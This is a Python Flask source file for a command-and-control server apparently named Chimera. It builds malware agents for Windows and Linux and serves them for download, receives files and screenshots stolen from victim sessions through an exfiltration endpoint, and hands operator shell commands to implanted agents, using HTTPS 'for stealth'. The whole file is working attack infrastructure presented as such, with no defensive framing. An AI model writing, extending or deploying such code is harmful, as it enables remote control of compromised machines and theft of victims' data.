# server/chimera_server.py
from flask import Flask, request, send_file
import os
import json
import threading

app = Flask(__name__)
STAGING_DIR = "staging/"  # Where payloads are built
REPORTS_DIR = "reports/"  # Where data is stored

@app.route('/build', methods=['POST'])
def build_payload():
    """Endpoint to compile a payload based on target OS"""
    data = request.json
    target_os = data['os'] # 'windows', 'linux', 'android'
    
    print(f"[+] Building payload for {target_os}")
    
    # ORCHESTRATION: Call the specific builder script
    if target_os == "windows":
        # Use PowerShell/C++ compiler logic
        os.system("bash builders/build_windows.sh")
    elif target_os == "linux":
        os.system("g++ builders/linux_agent.cpp -o staging/agent_linux -lpthread")
    
    return send_file('staging/agent_linux', as_attachment=True)

@app.route('/exfil/<session_id>', methods=['POST'])
def receive_data(session_id):
    """Receive stolen data or screenshots"""
    if 'file' in request.files:
        file = request.files['file']
        path = f"{REPORTS_DIR}{session_id}_{file.filename}"
        file.save(path)
        print(f"[+] Received exfil from {session_id}: {path}")
    return {"status": "ok"}

@app.route('/command/<session_id>')
def send_command(session_id):
    """The agent checks for new orders"""
    # In a real scenario, this would read from a command queue.
    cmd = input(f"CHIMERA-SHELL[{session_id}]> ")
    return {"command": cmd}

def start_server():
    if not os.path.exists(REPORTS_DIR):
        os.makedirs(REPORTS_DIR)
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc') # HTTPS for stealth

if __name__ == '__main__':
    start_server()
